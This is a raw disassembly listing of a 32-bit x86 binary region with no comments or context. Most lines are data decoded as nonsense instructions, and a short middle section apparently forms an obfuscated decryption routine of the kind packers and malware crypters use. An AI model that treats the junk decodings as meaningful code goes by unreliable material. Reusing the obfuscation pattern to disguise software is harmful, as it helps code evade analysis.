  4041ff:	inc    ebx
  404200:	sbb    eax,0x76aacdd1
  404205:	daa    
  404206:	xchg   esp,eax
  404207:	clc    
  404208:	dec    eax
  404209:	xchg   ecx,eax
  40420a:	aad    0x9c
  40420c:	add    DWORD PTR [eax+0x6a04738c],edi
  404212:	pop    eax
  404213:	scas   al,BYTE PTR es:[edi]
  404214:	mov    WORD PTR [ebx-0x225cb3a6],fs
  40421a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40421b:	sbb    cl,BYTE PTR [edx+0x24]
  40421e:	lea    ebp,[edx-0x5b2edf73]
  404224:	nop
  404225:	hlt    
  404226:	xchg   DWORD PTR [esi+ecx*2+0x1bacfe84],edx
  40422d:	test   eax,0x1258f4d7
  404232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404233:	xchg   ebp,eax
  404234:	clc    
  404235:	jo     0x40424a
  404237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404238:	xchg   ecx,eax
  404239:	mov    ds:0x5beef050,eax
  40423e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40423f:	cmp    BYTE PTR [esi-0x70],0xeb
  404243:	mov    eax,ds:0xfb3d4949
  404248:	mov    DWORD PTR [ebp-0x38d7424f],ebx
  40424e:	pop    esp
  40424f:	push   ds
  404250:	mov    BYTE PTR [ebx+0x1e],dl
  404253:	jne    0x404206
  404255:	push   esp
  404256:	mov    DWORD PTR [ebx-0x648ad064],ebp
  40425c:	aas    
  40425d:	sti    
  40425e:	mov    ebx,esp
  404260:	mov    esp,0xd2433fa4
  404265:	jb     0x4042ad
  404267:	arpl   WORD PTR [ebx-0x512a114b],si
  40426d:	add    BYTE PTR [edi-0x6b],bl
  404270:	push   eax
  404271:	pop    ebp
  404272:	and    DWORD PTR [edi-0x12],ecx
  404275:	mov    dh,0x75
  404277:	ds pop ebx
  404279:	hlt    
  40427a:	adc    al,0x51
  40427c:	mov    dh,0xfe
  40427e:	std    
  40427f:	mov    ecx,0xfddeb024
  404284:	retf   
  404285:	(bad)  
  404286:	mov    dh,0x4a
  404288:	xchg   ebp,eax
  404289:	adc    BYTE PTR [edx],dl
  40428b:	nop
  40428c:	mov    dh,0x20
  40428e:	arpl   WORD PTR [eax*8-0x6c43802d],bp
  404295:	push   cs
  404296:	mov    esp,0xfcb2c4b2
  40429b:	and    BYTE PTR [esi-0x3c1d44e1],0x9c
  4042a2:	enter  0x1508,0x56
  4042a6:	loopne 0x404242
  4042a8:	or     eax,0xf0c28241
  4042ad:	test   BYTE PTR [ebp-0x6a],al
  4042b0:	pop    ds
  4042b1:	adc    ax,0xfeaa
  4042b5:	pop    edi
  4042b6:	sbb    al,0x91
  4042b8:	popa   
  4042b9:	adc    eax,0x7188021e
  4042be:	pop    edx
  4042bf:	dec    eax
  4042c0:	sbb    eax,DWORD PTR [ebp+ebp*1-0x7b38f607]
  4042c7:	mov    ds:0xbb83a845,al
  4042cc:	shl    BYTE PTR [ebp+0x7cc11fd3],1
  4042d2:	arpl   cx,di
  4042d4:	fs mov ebx,0xb0e3fb1b
  4042da:	stos   BYTE PTR es:[edi],al
  4042db:	xchg   esp,eax
  4042dc:	mov    esp,0x3083f787
  4042e1:	pop    ecx
  4042e2:	pop    es
  4042e3:	sbb    BYTE PTR [edx+0x78],0x5a
  4042e7:	fisub  DWORD PTR [ebx-0x5bfbde45]
  4042ed:	mov    bl,0x5
  4042ef:	pop    edi
  4042f0:	ret    
  4042f1:	mov    eax,0xa7585bfd
  4042f6:	push   ebp
  4042f7:	jns    0x404370
  4042f9:	push   0x9462ed6e
  4042fe:	rcr    BYTE PTR [eax],0x18
  404301:	lods   al,BYTE PTR ds:[esi]
  404302:	loope  0x4042c9
  404304:	arpl   WORD PTR [esp+ebx*4+0x2b],bp
  404308:	out    0xa3,al
  40430a:	jne    0x404367
  40430c:	in     eax,0xe5
  40430e:	clc    
  40430f:	sbb    ch,BYTE PTR [esi-0x1b]
  404312:	mov    bl,0xa
  404314:	outs   dx,DWORD PTR ds:[esi]
  404315:	or     DWORD PTR [eax-0x333a7283],0x0
  40431c:	jmp    0xc5d7c02
  404321:	xlat   BYTE PTR ds:[ebx]
  404322:	outs   dx,BYTE PTR ds:[esi]
  404323:	bound  eax,QWORD PTR [edx]
  404325:	sbb    ebp,DWORD PTR [eax+0x4e10fb7e]
  40432b:	mov    ebp,0x107fbce4
  404330:	ins    BYTE PTR es:[edi],dx
  404331:	in     al,0x6c
  404333:	mov    edi,0xcb480b94
  404338:	and    BYTE PTR [ecx-0x4e],dh
  40433b:	jns    0x4042f7
  40433d:	or     BYTE PTR [eax-0x67],dh
  404340:	xchg   esp,eax
  404341:	ins    BYTE PTR es:[edi],dx
  404342:	cmp    esp,DWORD PTR [edx+0x1c]
  404345:	bound  ecx,QWORD PTR [ebx+0x5c7ec4d]
  40434b:	call   0x66:0x72004229
  404352:	add    BYTE PTR [ebx],bh
  404354:	add    edi,eax
  404356:	add    eax,0x42289a
  40435b:	loopne 0x404369
  40435d:	add    BYTE PTR [eax],al
  40435f:	jne    0x4044cf
  404365:	or     eax,DWORD PTR ds:0x422922
  40436b:	mov    eax,DWORD PTR [ebp-0xc]
  40436e:	cmp    DWORD PTR ds:0x4229ce,0x0
  404375:	mov    ecx,DWORD PTR ds:0x4229b2
  40437b:	not    ecx
  40437d:	jmp    0x4043e2
  404382:	mov    DWORD PTR ds:0x4228ce,0x6b59
  40438c:	mov    DWORD PTR ds:0x4228a6,edi
  404392:	jb     0x4043a7
  404398:	push   0x82d3
  40439d:	call   DWORD PTR ds:0x42a010
  4043a3:	xor    ecx,ecx
  4043a5:	adc    edx,ecx
  4043a7:	or     DWORD PTR ds:0x422992,0x7718
  4043b1:	mov    ecx,DWORD PTR ds:0x422a76
  4043b7:	mov    edx,DWORD PTR ds:0x422ade
  4043bd:	sub    ecx,edx
  4043bf:	xor    ecx,DWORD PTR [ecx+edx*1]
  4043c2:	mov    ecx,DWORD PTR ds:0x4229fe
  4043c8:	xor    edx,edx
  4043ca:	or     edx,DWORD PTR ds:0x422ace
  4043d0:	sub    edx,ecx
  4043d2:	sub    ecx,DWORD PTR [ecx+edx*1]
  4043d5:	movzx  edx,BYTE PTR ds:0x42292e
  4043dc:	add    DWORD PTR ds:0x4229a2,edx
  4043e2:	mov    ecx,DWORD PTR [ebp+0x20]
  4043e5:	movzx  edx,WORD PTR ds:0x4229ba
  4043ec:	or     edx,DWORD PTR ds:0x4229b2
  4043f2:	mov    DWORD PTR ds:0x4229ba,edx
  4043f8:	xor    DWORD PTR [eax],ecx
  4043fa:	mov    eax,DWORD PTR [ebp-0xc]
  4043fd:	mov    ecx,DWORD PTR [ebp+0x18]
  404400:	adc    DWORD PTR ds:0x422992,0x4b0d
  40440a:	mov    edx,DWORD PTR [ebp+0x1c]
  40440d:	shrd   ecx,edx,0x2
  404411:	and    DWORD PTR ds:0x4229ba,0x18b0
  40441b:	mov    DWORD PTR [ebp-0x14],ecx
  40441e:	add    ecx,0x56bc
  404424:	mov    ecx,DWORD PTR [ebp+0x18]
  404427:	xor    DWORD PTR [ebp-0x14],edi
  40442a:	sbb    DWORD PTR ds:0x42291e,0x4252
  404434:	shr    edx,0x2
  404437:	mov    edx,DWORD PTR [ebp+0x1c]
  40443a:	add    DWORD PTR ds:0x4228ce,0x42299e
  404444:	xor    edx,edx
  404446:	and    DWORD PTR ds:0x4228d6,0x4228ea
  404450:	or     edx,DWORD PTR [ebp-0x14]
  404453:	add    DWORD PTR ds:0x42289e,0x4229a2
  40445d:	shl    ecx,0x1e
  404460:	cmp    DWORD PTR ds:0x42294e,0x0
  404467:	mov    ecx,0x1e7
  40446c:	mov    DWORD PTR ds:0x4228ba,0x3be7
  404476:	mov    DWORD PTR ds:0x4229a2,edx
  40447c:	mov    ecx,0x41a9
  404481:	jmp    0x4044cd
  404486:	mov    DWORD PTR ds:0x42297a,0x6783
  404490:	mov    DWORD PTR ds:0x4228ee,0x5319
  40449a:	jl     0x4044b5
  4044a0:	push   DWORD PTR [ebp-0x18]
  4044a3:	call   DWORD PTR ds:0x42a014
  4044a9:	or     ecx,DWORD PTR ds:0x42290e
  4044af:	xor    DWORD PTR ds:0x4228d6,ebx
  4044b5:	xor    DWORD PTR ds:0x4229b2,0x1ac5
  4044bf:	inc    DWORD PTR ds:0x422956
  4044c5:	add    ecx,0x7d03
  4044cb:	not    ecx
  4044cd:	sub    DWORD PTR [eax],edx
  4044cf:	mov    eax,ds:0x4220e0
  4044d4:	mov    ecx,DWORD PTR [ebp-0xc]
  4044d7:	sbb    edx,DWORD PTR ds:0x4228c2
  4044dd:	mov    eax,DWORD PTR [eax]
  4044df:	add    eax,DWORD PTR [ecx]
  4044e1:	mov    edx,DWORD PTR ds:0x42297e
  4044e7:	and    edx,DWORD PTR ds:0x42288e
  4044ed:	mov    DWORD PTR ds:0x42297e,edx
  4044f3:	mov    DWORD PTR [ebp-0x14],eax
  4044f6:	mov    ecx,DWORD PTR [ebx]
  4044f8:	or     DWORD PTR ds:0x422922,edx
  4044fe:	mov    eax,DWORD PTR [ebx+0x4]
  404501:	xor    DWORD PTR ds:0x42299e,ebx
  404507:	jmp    0x404a91
  40450c:	xlat   BYTE PTR ds:[ebx]
  40450d:	mov    edi,0x38f472f4
  404512:	push   eax
  404513:	xor    dl,BYTE PTR [eax-0x6597dd72]
  404519:	es loopne 0x404590
  40451c:	xchg   ecx,eax
  40451e:	push   ss
  40451f:	push   ss
  404520:	cmp    eax,0x23161604
  404525:	pop    ds
  404526:	std    
  404527:	in     al,0xa9
  404529:	arpl   WORD PTR [ebx+edi*1],cx
  40452c:	sub    eax,ecx
  40452e:	hlt    
  40452f:	pop    edi
  404530:	pop    ecx
  404531:	fidivr WORD PTR [ecx+0x4204034b]
  404537:	ins    DWORD PTR es:[edi],dx
  404538:	pop    ds
  404539:	std    
  40453a:	jle    0x4044d9
  40453c:	ret    
  40453d:	add    BYTE PTR [edx+0x6e19d12],dh
  404543:	xchg   ecx,eax
  404544:	arpl   WORD PTR [ecx],bx
  404546:	clc    
  404547:	call   0x9b2072de
  40454c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40454d:	push   ds
  40454e:	imul   eax,ebx,0xdff3edb
  404554:	jae    0x404574
  404556:	push   edx
  404557:	(bad)  
  404558:	and    eax,DWORD PTR [esi+eax*4+0x47046a7]
  40455f:	pop    esp
  404560:	int    0x34
  404562:	cmp    DWORD PTR [esi+ebp*4-0x1cb9c93b],ebx
  404569:	(bad)  
  40456a:	lock out 0x4b,eax
  40456d:	loopne 0x404525
  40456f:	sbb    eax,0x9e956647
  404574:	test   al,0x38
  404576:	stc    
  404577:	dec    eax
  404578:	pop    ebp
  404579:	hlt    
  40457a:	mov    ebp,DWORD PTR ds:0x9b0cb2ab
  404580:	ins    BYTE PTR es:[edi],dx
  404581:	xor    BYTE PTR [edi],ch
  404583:	cmp    BYTE PTR [ecx-0x7b],0x6e
  404587:	cmp    ah,BYTE PTR [edi+0x2b50aba2]
  40458d:	pop    ecx
  40458e:	inc    esi
  40458f:	das    
  404590:	popf   
  404591:	dec    ebp
  404592:	fstp   QWORD PTR [edx-0x12e408ff]
  404598:	xchg   BYTE PTR [ebx+0x46c6ef21],cl
  40459e:	sbb    DWORD PTR [edx+0xa530e5],eax
  4045a4:	sbb    ebp,DWORD PTR [eax]
  4045a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045a7:	and    al,0x7a
  4045a9:	aas    
  4045aa:	add    BYTE PTR [ecx+edi*4+0x7],ch
  4045ae:	pop    edx
  4045af:	call   DWORD PTR [edi-0xa]
  4045b2:	xchg   ecx,eax
  4045b3:	shl    DWORD PTR [edi-0x2a],1
  4045b6:	aas    
  4045b7:	and    BYTE PTR [eax],cl
  4045b9:	sub    eax,0x7311897b
  4045be:	mov    dl,bh
  4045c0:	ins    DWORD PTR es:[edi],dx
  4045c1:	lahf   
  4045c2:	loopne 0x404566
  4045c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045c5:	dec    edx
  4045c6:	call   0xeb6db61d
  4045cb:	inc    edx
  4045cc:	add    ah,BYTE PTR [esi]
  4045ce:	(bad)  
  4045cf:	jecxz  0x4045c5
  4045d1:	or     BYTE PTR [esi-0x58],cl
  4045d4:	sbb    al,0xa
  4045d6:	dec    edx
  4045d7:	int3   
  4045d8:	pop    eax
  4045d9:	add    BYTE PTR [edi],ah
  4045db:	sbb    DWORD PTR [eax+0x55],0x10
  4045df:	pop    es
  4045e0:	arpl   WORD PTR [ebx-0x76],di
  4045e3:	imul   ebx,DWORD PTR [eax+edi*4+0x531d162],0x2755fa8f
  4045ee:	jmp    0x404639
  4045f0:	or     dh,0x68
  4045f3:	xchg   ecx,eax
  4045f4:	mov    bl,0x88
  4045f6:	mov    bh,0x59
  4045f8:	sbb    ebx,ebp
  4045fa:	clc    
  4045fb:	sub    BYTE PTR [esi+0x2d],bh
  4045fe:	cmp    DWORD PTR [ebp+0x2e],ebx
  404601:	aam    0x20
  404603:	gs icebp 
  404605:	mov    dl,0x53
  404607:	je     0x404616
  404609:	ins    DWORD PTR es:[edi],dx
  40460a:	out    dx,eax
  40460b:	mov    esi,0x9db4e251
  404610:	jg     0x4045f7
  404612:	shr    DWORD PTR [ecx],0x3
  404615:	lock inc edi
  404617:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404619:	lahf   
  40461a:	ins    BYTE PTR es:[edi],dx
  40461b:	lods   al,BYTE PTR ds:[esi]
  40461c:	jge    0x40469a
  40461e:	push   ds
  40461f:	push   eax
  404620:	xchg   esp,eax
  404621:	jecxz  0x4045c2
  404623:	icebp  
  404624:	in     eax,0xa7
  404626:	push   ss
  404627:	jl     0x404680
  404629:	push   ecx
  40462a:	adc    DWORD PTR [edi-0x7b],ebx
  40462d:	adc    ebx,DWORD PTR [eax-0x15042f65]
  404633:	and    edi,ebp
  404635:	add    eax,0x52ec3103
  40463a:	lahf   
  40463b:	push   ss
  40463c:	push   ebp
  40463d:	ja     0x40467e
  40463f:	hlt    
  404640:	pop    ss
  404641:	jl     0x40466c
  404643:	mov    al,ds:0x2e085b07
  404648:	adc    eax,0xc9734115
  40464d:	xor    esp,DWORD PTR [ecx]
  40464f:	jp     0x404623
  404651:	enter  0x98f8,0x46
  404655:	int    0x21
  404657:	sbb    BYTE PTR [eax+eax*8+0x7c6f0c87],bh
  40465e:	pop    ss
  40465f:	xor    DWORD PTR [ebx-0x5f],ebx
  404662:	in     al,0x59
  404664:	fdiv   DWORD PTR [edi+0x64]
  404667:	(bad)  
  404668:	out    dx,al
  404669:	cmp    esp,DWORD PTR [esi-0x4804660c]
  40466f:	push   cs
  404670:	ss or  al,0xa7
  404673:	adc    BYTE PTR [esi+0x6346519a],0xbb
  40467a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40467b:	cmp    eax,0xc119b352
  404680:	dec    ebp
  404681:	push   ebx
  404682:	shl    BYTE PTR [ebx-0x4b],cl
  404685:	pop    esi
  404686:	shr    DWORD PTR [ebp+eiz*1-0x75d865fc],1
  40468d:	add    eax,0x7e422eb0
  404692:	dec    ebp
  404693:	mov    WORD PTR [eax],cs
  404695:	ret    0x3702
  404698:	stos   BYTE PTR es:[edi],al
  404699:	ret    
  40469a:	cmp    al,0xe8
  40469c:	xchg   BYTE PTR [eax-0x4c],dl
  40469f:	xor    BYTE PTR [ecx+0x2a3f8621],dh
  4046a5:	ret    0x979d
  4046a8:	shl    edi,0x24
  4046ab:	pop    edx
  4046ac:	not    DWORD PTR [edx-0xdcec4b3]
  4046b2:	test   BYTE PTR [ebp-0x7763ab57],bl
  4046b8:	pop    es
  4046b9:	add    eax,0xc4bf5653
  4046be:	aaa    
  4046bf:	inc    esp
  4046c0:	ror    DWORD PTR [ecx+0xcc78738],0xdc
  4046c7:	jb     0x4046f0
  4046c9:	out    dx,eax
  4046ca:	adc    dh,ch
  4046cc:	push   cs
  4046cd:	daa    
  4046ce:	or     bh,BYTE PTR fs:[edi+0x270255c1]
  4046d5:	(bad)  
  4046d6:	cmc    
  4046d7:	ret    
  4046d8:	es or  eax,0xec821b06
  4046de:	push   esp
  4046df:	shl    BYTE PTR [edi+esi*2+0x4bb1891],0xad
  4046e7:	inc    edi
  4046e8:	mov    cs,WORD PTR [eax-0x7dd8c72a]
  4046ee:	mov    DWORD PTR [eax+ebx*1-0x4ac5508e],0x9ebc84af
  4046f9:	add    BYTE PTR [ecx-0x3cfebc00],cl
  4046ff:	fsub   QWORD PTR [edi-0x61]
  404702:	into   
  404703:	(bad)  
  404705:	xor    BYTE PTR [ecx-0x36f1ed45],0x37
  40470c:	cs mov esi,0xcfed5376
  404712:	popf   
  404713:	les    edi,FWORD PTR [edx+0x60]
  404716:	xor    al,0xb3
  404718:	pop    ebx
  404719:	iret   
  40471a:	cli    
  40471b:	push   eax
  40471c:	and    ah,BYTE PTR [ebp-0xd7323ad]
  404722:	push   edi
  404723:	call   0x8fd3:0x313189ed
  40472a:	(bad)  
  40472b:	hlt    
  40472c:	add    al,0x32
  40472e:	stos   DWORD PTR es:[edi],eax
  40472f:	dec    eax
  404730:	jge    0x4047b0
  404732:	or     DWORD PTR [eax+ebx*4],ebx
  404735:	fldcw  WORD PTR [ebx]
  404737:	lahf   
  404738:	hlt    
  404739:	ds sub al,0x24
  40473c:	outs   dx,DWORD PTR ds:[esi]
  40473d:	adc    ebp,DWORD PTR [edx-0x75]
  404740:	call   0x3a06:0xbfd8715a
  404747:	out    dx,eax
  404748:	xchg   edx,eax
  404749:	fsubr  QWORD PTR [edx-0x4]
  40474c:	outs   dx,DWORD PTR ds:[esi]
  40474d:	cmp    ecx,DWORD PTR [edx-0x742d3fc8]
  404753:	dec    ebp
  404754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404755:	sub    eax,0xb3909e6b
  40475a:	jp     0x404778
  40475c:	clc    
  40475d:	jae    0x40471b
  40475f:	in     eax,dx
  404760:	xlat   BYTE PTR ds:[ebx]
  404761:	pop    ss
  404762:	leave  
  404763:	push   ebp
  404764:	popf   
  404765:	dec    edx
  404766:	out    0x13,eax
  404768:	mov    bl,bl
  40476a:	cmp    al,0x1
  40476c:	xor    al,0xf2
  40476e:	add    eax,0x9f18f023
  404773:	lods   eax,DWORD PTR ds:[esi]
  404774:	add    BYTE PTR [ebx+0x32],cl
  404777:	sub    DWORD PTR [esi],esp
  404779:	sub    al,0x39
  40477b:	mov    dl,0xcd
  40477d:	sti    
  40477e:	retf   0xdad
  404781:	adc    bh,dh
  404783:	mov    eax,0x94ffb90d
  404788:	and    esi,eax
  40478a:	mov    ds:0xfaa396b,al
  40478f:	mov    eax,0xd22f8964
  404794:	dec    eax
  404795:	pushf  
  404796:	sbb    al,0xd3
  404798:	mov    edx,edi
  40479a:	out    dx,al
  40479b:	in     al,0xe8
  40479d:	jle    0x40478b
  40479f:	(bad)  [edx-0x39617140]
  4047a5:	and    ch,BYTE PTR [edx+ecx*4]
  4047a8:	(bad)  
  4047a9:	push   esp
  4047aa:	dec    esi
  4047ab:	mov    ecx,0x26be8b80
  4047b0:	mov    eax,ebx
  4047b2:	out    0x5a,al
  4047b4:	or     eax,0xc8a74703
  4047b9:	pop    es
  4047ba:	(bad)  
  4047bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047bc:	les    esi,FWORD PTR [edx+ebp*1-0x61]
  4047c0:	fld    DWORD PTR [esi+0x4c8e0016]
  4047c6:	adc    edi,eax
  4047c8:	mov    ds:0x888aac9f,al
  4047cd:	enter  0x6ce9,0x3a
  4047d1:	icebp  
  4047d2:	pushf  
  4047d3:	popa   
  4047d4:	int3   
  4047d5:	dec    ebp
  4047d6:	sbb    DWORD PTR [esi+0x47],ebp
  4047d9:	jmp    FWORD PTR [edi]
  4047db:	pop    ecx
  4047dc:	enter  0x989f,0xba
  4047e0:	jmp    DWORD PTR [edx+0x6d4f087c]
  4047e6:	jbe    0x40482d
  4047e8:	push   esi
  4047e9:	fisttp WORD PTR [eax]
  4047eb:	shl    bh,cl
  4047ed:	jl     0x4047d9
  4047ef:	(bad)  
  4047f0:	xchg   esp,eax
  4047f1:	and    BYTE PTR [edx-0x33],ah
  4047f4:	xchg   ecx,eax
  4047f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047f6:	mov    dh,0xe9
  4047f8:	arpl   WORD PTR [ecx],bp
  4047fa:	shl    BYTE PTR ds:0xdcf68c3f,1
  404800:	mov    BYTE PTR [ecx+0x53],ch
  404803:	dec    ebx
  404804:	push   ds
  404805:	sti    
  404806:	out    0x2d,eax
  404808:	(bad)  
  404809:	fnstcw WORD PTR [ebp+0x60]
  40480c:	(bad)  
  40480d:	fadd   DWORD PTR [ecx-0x44]
  404810:	pop    ebp
  404811:	shr    BYTE PTR [ebx],0x6f
  404814:	je     0x404811
  404816:	out    0x58,al
  404818:	shl    BYTE PTR [eax+0x77],1
  40481b:	jae    0x40481e
  40481d:	mov    bl,0xf9
  40481f:	mov    bl,BYTE PTR [edx]
  404821:	sbb    DWORD PTR [eax],esp
  404823:	out    0x22,al
  404825:	sub    eax,0xefea44a0
  40482a:	push   ebp
  40482b:	pushf  
  40482c:	sahf   
  40482d:	imul   ebx,DWORD PTR [ebx],0x6b
  404830:	loope  0x404809
  404832:	and    DWORD PTR [esi-0x1c],0x114549a9
  404839:	cmp    DWORD PTR [eax+0x4f686568],edi
  40483f:	mov    edx,0x5bd44b58
  404844:	cmp    eax,0xcbd2263a
  404849:	pop    edi
  40484a:	gs int 0x12
  40484d:	(bad)  
  40484e:	repz inc ebx
  404850:	adc    DWORD PTR [eax+eax*4+0x349e0639],ebp
  404857:	out    dx,eax
  404858:	mov    BYTE PTR [ecx],0xf2
  40485b:	push   es
  40485c:	out    0x98,al
  40485e:	dec    ebp
  40485f:	cmp    al,0xc9
  404861:	push   esi
  404862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404863:	mov    ch,bl
  404865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404866:	gs mov bl,0x2c
  404869:	sar    BYTE PTR [esi],0xf
  40486c:	ret    0x9f6a
  40486f:	lds    edx,FWORD PTR [edx+0x417e9b90]
  404875:	inc    esi
  404876:	sbb    esp,0xffffff9d
  404879:	inc    eax
  40487a:	add    dh,BYTE PTR [esi-0x40]
  40487d:	mov    al,BYTE PTR [esi+ecx*1]
  404880:	gs pop es
  404882:	mov    ah,0xd5
  404884:	pavgw  mm0,QWORD PTR [esi+0x55]
  404888:	push   esp
  404889:	call   FWORD PTR [eax-0x71]
  40488c:	xchg   ebp,eax
  40488d:	sbb    al,0x1e
  40488f:	addr16 mov esp,0x47798855
  404895:	pop    ebp
  404896:	das    
  404897:	sti    
  404898:	sub    DWORD PTR [edi+0x4a],0xffffffff
  40489c:	push   0xf606a282
  4048a1:	mov    edi,0x430ebdad
  4048a6:	loop   0x4048b9
  4048a8:	test   DWORD PTR [eax+0x50ddd5a8],ecx
  4048ae:	inc    ecx
  4048af:	push   ebp
  4048b0:	xchg   edi,eax
  4048b1:	arpl   WORD PTR ds:0x9b65b14e,bp
  4048b7:	jns    0x404900
  4048b9:	pushf  
  4048ba:	add    ch,BYTE PTR [ecx]
  4048bc:	(bad)  
  4048bd:	adc    BYTE PTR [esi+0x7f9222d6],cl
  4048c3:	out    0xac,eax
  4048c5:	jecxz  0x4048a1
  4048c7:	jb     0x404925
  4048c9:	pop    ebx
  4048ca:	fs mov ebp,0xd839e6f9
  4048d0:	loop   0x40489b
  4048d2:	ja     0x4048b3
  4048d4:	jecxz  0x404927
  4048d6:	mov    dh,0x84
  4048d8:	dec    esi
  4048d9:	clc    
  4048da:	leave  
  4048db:	mov    ebx,0x4a2142d
  4048e0:	mov    ah,0x1b
  4048e2:	adc    eax,0xe94439d4
  4048e7:	ja     0x4048bc
  4048e9:	mov    ax,ds:0x5b53482d
  4048ef:	fmul   QWORD PTR [ebp+0x227abac7]
  4048f5:	add    al,0x12
  4048f7:	mov    al,ds:0x4d9dc952
  4048fc:	pop    ebx
  4048fd:	jg     0x40495c
  4048ff:	push   ebx
  404900:	in     al,dx
  404901:	repz mov eax,0xecc8fd1
  404907:	pop    esp
  404908:	sub    edi,DWORD PTR [esi-0x4c8c9504]
  40490e:	(bad)  
  40490f:	shl    DWORD PTR [eax+0x1a],0x4c
  404913:	xor    eax,0xa9dd78c
  404918:	rcr    DWORD PTR [eax],0xd
  40491b:	xor    DWORD PTR [eax-0x3d52335a],0xe0d08316
  404925:	out    0xc9,eax
  404927:	(bad)  
  404929:	pop    ebx
  40492a:	jno    0x404962
  40492c:	lahf   
  40492d:	mov    al,ds:0x37cc3c2c
  404932:	js     0x4049a5
  404934:	xchg   BYTE PTR [ecx-0x5e],al
  404937:	test   BYTE PTR [edx+0x35799a1c],cl
  40493d:	int3   
  40493e:	mov    eax,ds:0xc0f74643
  404943:	pop    ds
  404944:	cmp    ebp,DWORD PTR [esi+0x22]
  404947:	shr    DWORD PTR ds:0x2d978799,cl
  40494d:	xadd   BYTE PTR [eax],bl
  404950:	adc    BYTE PTR [ecx+0x3e57de77],dh
  404956:	fisubr WORD PTR ds:0xa9bd207a
  40495c:	cmp    al,0x49
  40495e:	out    0x93,eax
  404960:	icebp  
  404961:	std    
  404962:	xchg   edx,eax
  404963:	jp     0x4049cc
  404965:	push   ss
  404966:	mov    eax,ds:0xca40e8c6
  40496b:	push   edx
  40496c:	icebp  
  40496d:	push   0xffffffb9
  40496f:	sbb    BYTE PTR [ebx+esi*8-0x9e46a37],ch
  404976:	mov    dh,0xf5
  404978:	xor    al,0x3f
  40497a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40497b:	sbb    ecx,DWORD PTR [edi-0x42]
  40497e:	and    eax,0x1048ca1a
  404983:	xchg   edi,eax
  404984:	xor    ebp,ebx
  404986:	pop    edi
  404987:	in     eax,0x87
  404989:	out    dx,al
  40498a:	jmp    0x91c94301
  40498f:	push   esp
  404990:	cld    
  404991:	push   ebp
  404992:	fcmovnb st,st(4)
  404994:	xor    al,0x51
  404996:	in     al,dx
  404997:	scas   eax,DWORD PTR es:[edi]
  404998:	cld    
  404999:	xor    bh,BYTE PTR [edi-0x3dcab5c1]
  40499f:	xor    BYTE PTR [ebx],ch
  4049a1:	dec    ebp
  4049a2:	ret    
  4049a3:	test   al,0x78
  4049a5:	mov    ds,eax
  4049a7:	fld    DWORD PTR [ebx+edi*4+0x58e4664c]
  4049ae:	jge    0x404a27
  4049b0:	lods   al,BYTE PTR ds:[esi]
  4049b1:	xchg   edi,eax
  4049b2:	jmp    FWORD PTR [eax]
  4049b4:	mov    al,ds:0x865913fb
  4049b9:	in     eax,0xcb
  4049bb:	loope  0x40497b
  4049bd:	sbb    dh,BYTE PTR [eax]
  4049bf:	push   edx
  4049c0:	cmp    BYTE PTR [ebp+edx*1+0x1],0x9e
  4049c5:	pop    es
  4049c6:	pop    ss
  4049c7:	lahf   
  4049c8:	ror    DWORD PTR [ebx+0x62662175],cl
  4049ce:	out    0xef,eax
  4049d0:	jb     0x404a13
  4049d2:	leave  
  4049d3:	jp     0x404a4f
  4049d5:	inc    ebx
  4049d6:	nop
  4049d7:	cdq    
  4049d8:	ins    DWORD PTR es:[edi],dx
  4049d9:	call   0x41691549
  4049de:	mov    edi,DWORD PTR [ebx]
  4049e0:	stos   BYTE PTR es:[edi],al
  4049e1:	xchg   esi,eax
  4049e2:	scas   al,BYTE PTR es:[edi]
  4049e3:	addr16 int3 
  4049e5:	dec    edi
  4049e6:	add    BYTE PTR [ebp-0x4d2fbf5f],cl
  4049ec:	cmp    al,0xb3
  4049ee:	shr    DWORD PTR [ebx+0x1e],1
  4049f1:	test   eax,0xe50be538
  4049f6:	repnz cdq 
  4049f8:	mov    dh,0x7e
  4049fa:	(bad)  
  4049fc:	scas   eax,DWORD PTR es:[edi]
  4049fd:	jns    0x404a42
  4049ff:	cmp    eax,0x1270bec7
  404a04:	mov    bl,0x6
  404a06:	in     eax,0x41
  404a08:	xchg   ecx,eax
  404a09:	add    bl,BYTE PTR [edi+0x26]
  404a0c:	retf   
  404a0d:	dec    ecx
  404a0e:	pop    edx
  404a0f:	xor    dh,ah
  404a11:	mov    es,WORD PTR [ecx-0x2b2ca5c4]
  404a17:	and    ecx,DWORD PTR [ebp+0x18]
  404a1a:	jge    0x4049ec
  404a1c:	ja     0x404a7d
  404a1e:	fwait
  404a1f:	mov    bh,0x44
  404a21:	push   0x2d
  404a23:	data16 fisub DWORD PTR [esi+0x61f6edc2]
  404a2a:	ja     0x404a30
  404a2c:	out    0x8b,eax
  404a2e:	retf   0x3e8e
  404a31:	(bad)  
  404a32:	mov    ds:0xba027888,al
  404a37:	jnp    0x4049f7
  404a39:	ret    0xbb08
  404a3c:	inc    eax
  404a3d:	push   ds
  404a3e:	scas   eax,DWORD PTR es:[edi]
  404a3f:	mov    ecx,DWORD PTR [edx]
  404a41:	call   FWORD PTR [ebx-0x45]
  404a44:	clc    
  404a45:	xor    DWORD PTR [ecx-0x15],edx
  404a48:	sub    BYTE PTR [esi+ebx*4],al
  404a4b:	xor    BYTE PTR [eax],dl
  404a4d:	inc    esi
  404a4e:	fild   QWORD PTR [eax]
  404a50:	dec    eax
  404a51:	adc    ah,BYTE PTR [esi+edi*1+0x50202676]
  404a58:	cdq    
  404a59:	cwde   
  404a5a:	or     BYTE PTR [edx+0xd07f5b5],bh
  404a60:	pop    eax
  404a61:	out    0xb4,eax
  404a63:	cdq    
  404a64:	sub    al,0x36
  404a66:	loope  0x404ab7
  404a68:	aam    0x80
